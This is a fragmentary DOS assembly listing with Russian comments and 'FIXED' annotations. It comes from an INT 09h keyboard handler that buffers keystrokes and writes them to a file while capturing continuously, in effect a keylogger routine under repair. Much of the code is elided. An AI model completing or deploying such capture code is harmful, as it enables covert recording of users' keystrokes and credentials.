...
Max         =   256             ; Число нажатий и отжатий клавиш - FIXED:
...
; в противном случае - переход на "старый" обработчик 09h
         cmp     EnWrBuf, 0
         jz      OutOfHandler09h
         push    ax bx cx dx         ; FIXED: added cx dx for file operations
         ...
         cmp     Count, Max          ; Сравнение значения Count с Max -- FIXED: Compare Count (not bx) with Max
         jnz     BufNotFull
         
         ; Buffer is full - write to file immediately
         ; FIXED: Write to file here instead of waiting for INT 28h
...
SkipWrite:
         mov     Count, 0           ; FIXED: Reset counter
         ; EnWrBuf stays 1 to continue capturing

BufNotFull:
         pop     dx cx bx ax        ; FIXED: restore cx dx too
